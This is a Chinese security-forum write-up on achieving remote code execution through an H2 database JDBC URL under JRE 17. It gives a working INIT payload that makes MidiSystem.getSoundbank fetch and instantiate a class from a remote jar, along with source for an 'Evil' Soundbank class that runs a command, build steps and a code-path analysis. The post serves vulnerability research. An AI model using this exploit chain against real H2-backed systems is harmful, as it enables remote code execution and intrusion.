---
title: H2 RCE在JRE 17环境下的利用-续集
url: https://forum.butian.net/share/4414
source: 奇安信攻防社区
date: 2025-06-24
fetch_date: 2025-10-06T22:47:49.199366
---

# H2 RCE在JRE 17环境下的利用-续集

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### H2 RCE在JRE 17环境下的利用-续集

* [漏洞分析](https://forum.butian.net/topic/48)

@X1r0z 师傅的《H2 RCE在JRE 17环境下的利用》文章的后续挖掘发现

> 复现使用版本：
> JDK 17.0.11
> h2database 2.0.204
> codeql 使用 h2database 2.3.239编成数据库
> jdk17的codeql数据库没编译成功，所以使用的jdk8数据库 QAQ
前段时间看到一篇文章，@X1r0z 师傅的《H2 RCE 在 JDK 17 环境下的利用》，由于其中还需要使用到spring，突发奇想去挖一个不需要其他依赖，只需要jdk和h2的payload
文章如下：
```php
https://exp10it.io/2025/03/h2-rce-in-jre-17/
```
\*\*注：这就是没好好看文章的后果，其实文章是《H2 RCE 在 JRE 17 环境下的利用》，我看成是JDK17，JDK17原先的某些payload还是能用的，裂开\*\*
至此这篇文章就诞生了
由于在 Java 17 版本中删除了 Nashorn JavaScript 引擎 (更准确来说是在 Java 15 及以后被删除的)，且JRE没有javac命令，所以这种情况下常用的h2 payload都无法使用，详情@X1r0z 师傅的文章中都有提到，我就不过多赘述了，说说我的发现
一些失败的尝试
=======
参数是需要能够序列化的对象
比如说如下构造URLClassLoader无法进行序列化，所以无法使用
```java
java.beans.Beans.instantiate(URLClassLoader.newInstance(new URL[]{(URL)org.h2.util.Utils.newInstance("java.net.URL","http://127.0.0.1")}), "ClassName");
```
这里我找到了MLet，URLClassLoader的子类，实现了Externalizable能够进行序列化，可惜在jdk8中未发现静态的构造方法
然后就是jdk16之后的module强封装
这两个都是未开放的类
```php
//反射构造对象
sun.tools.jconsole.inspector.Utils.newStringConstructor(String type, String param)
//写文件
jdk.jfr.internal.Utils#writeGeneratedASM(String className, byte[] bytes)
```
判断开放包的位置：
public static方法在h2中调用的方式，是通过反射
Method.invoke(Object obj, Object... args)
在该位置判断了能否反射调用
![89baded185d02b27e653fdbfe40b0312.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-01f174f6332d530783ca658bccb72f5982c90a1e.png)
这里一直往下会走到
Module.isExported(String pn, Module other)
关键判断点，我没找到有啥静态方法能过掉的，菜，有师傅有兴趣的可以看看
![868b7318a0e2af9b8bbe53c3c696f23a.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-7ad84bd6d2548553b031d4759185d93aa484bee6.png)
Payload
=======
不废话直接上
这里String转Object使用了@X1r0z 师傅文章中提到的`javax.naming.ldap.Rdn.unescapeValue(java.lang.String)`
```java
jdbc:h2:mem:testdb;TRACE\_LEVEL\_SYSTEM\_OUT=3;INIT=CREATE ALIAS Utils\_INSTANCE FOR
'org.h2.util.Utils.newInstance(java.lang.String,java.lang.Object[])'\;
SET @classname\_str='java.net.URL'\;
CREATE ALIAS UNESCAPE\_VALUE FOR
'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)'\;
SET @url\_str='http://127.0.0.1:8000/1.jar'\;
SET @url\_obj=UNESCAPE\_VALUE(@url\_str)\;
SET @url\_object=Utils\_INSTANCE(@classname\_str,@url\_obj)\;
CREATE ALIAS System\_INSTANCE FOR
'java.lang.System.setProperty(java.lang.String,java.lang.String)'\;
CALL System\_INSTANCE('jdk.sound.jarsoundbank','true')\;
CREATE ALIAS MidiSystem\_INSTANCE FOR
'javax.sound.midi.MidiSystem.getSoundbank(java.net.URL)'\;
CALL MidiSystem\_INSTANCE(@url\_object)\;
```
jar文件构造
```php
src/
├── Evil.java
└── META-INF
└── services
└── javax.sound.midi.Soundbank
```
Evil.java文件内容
```java
import javax.sound.midi.Instrument;
import javax.sound.midi.Patch;
import javax.sound.midi.SoundbankResource;
import java.io.IOException;
public class Evil implements javax.sound.midi.Soundbank{
public Evil() throws IOException {
Runtime.getRuntime().exec("calc");
}
@Override
public String getName() {
return "";
}
@Override
public String getVersion() {
return "";
}
@Override
public String getVendor() {
return "";
}
@Override
public String getDescription() {
return "";
}
@Override
public SoundbankResource[] getResources() {
return new SoundbankResource[0];
}
@Override
public Instrument[] getInstruments() {
return new Instrument[0];
}
@Override
public Instrument getInstrument(Patch patch) {
return null;
}
}
```
javax.sound.midi.Soundbank 文件内容
```php
Evil
```
执行如下命令生成jar
```php
java17
javac src\Evil.java
jar -cvf payload.jar -C src/ .
```
![0be89c2b6ac883f48e9d8ffa5c789ef3.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-66769195e243bf34a90b246592f5c5a800512193.png)
分析
==
`javax.sound.midi.MidiSystem.getSoundbank(java.net.URL)`
这里会取到4个`SoundbankReader`的实现类，关键是`JARSoundbankReader#getSoundbank(URL)`
![1d7e9760dbebb929e2386ebf380ec28f.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-b24d94f371d9f4be46f241bccfa9eb3d72dcc594.png)
`JARSoundbankReader#getSoundbank(URL)`
这个方法是实现了和`serviceLoader.load(Class)`差不多的操作
![805aa3606f6da003e9047890bc356185.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-476080d4dec3ddc1bb39e67255a83345e195b828.png)
然后`Boolean.getBoolean(JAR\_SOUNDBANK\_ENABLED)`这个位置需要注意一下
这里需要调用`System.setProperty`给设置个true值，如果这个判断为false就直接return了
![32e238df6fe66f21f28061f642361643.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-4d1432c8f9376ab10f4f455e36e8f20f1854efc5.png)
![f332254a9b6798eeae6e587f4d97daa4.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-466b3512d2bbda177286fb78b531db7bad4c9de9.png)
![eb2dd0d37526939b63a3a95e89d87ceb.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-7e851f59e761871779d14323b52b29a20272cb38.png)
URL类的构造是使用H2database中的`org.h2.util.Utils.newInstance(java.lang.String,java.lang.Object[])`，利用反射构造对象
![3a318923f3179db77f352f85d5d24057.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-ed89645cfa08215ae8b6328c0a5d58c199b3d351.png)

* 发表于 2025-06-23 09:35:23
* 阅读 ( 2625 )
* 分类：[代码审计](https://forum.butian.net/community/code%20audit)

0 推荐
 收藏

## 1 条评论

[![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/b9e534117404dd9e2a3e4641ef974170eed91cf.jpg)](https://forum.butian.net/people/19026)

**[c铃儿响叮当](https://forum.butian.net/people/19026)**
2025-06-23 15:48

涨知识了

* [0 条评论](#comment-2558)
* 0

请先 [登录](https://forum.butian.net/login) 后评论

请先 [登录](https://forum.butian.net/login) 后评论

[![c3p0ooo!](https://forum.butian.net/static/images/default_avatar.jpg)](https://forum.butian.net/people/27424)

[c3p0ooo!](https://forum.butian.net/people/27424)

1 篇文章

[奇安信攻防社区](https://forum.butian.net)|
联系我们

|
[sitemap](https://forum.butian.net/sitemap)

Copyright © 2013-2023 BUTIAN.NET 版权所有 [京ICP备18014330号-2](https://beian.miit.gov.cn/#/Integrated/index)

×

#### 发送私信

请先 [登录](https://forum.butian.net/login) 后发送私信

×

#### 举报此文章

垃圾广告信息：
广告、推广、测试等内容

违规内容：
色情、暴力、血腥、敏感信息等内容

不友善内容：
人身攻击、挑衅辱骂、恶意行为

其他原因：
请补充说明

举报原因:

取消
举报

×

#### ![c3p0ooo!](https://forum.butian.net/static/images/default_avatar.jpg)

如果觉得我的文章对您有用，请随意打赏。你的支持将鼓励我继续创作！

![]()

---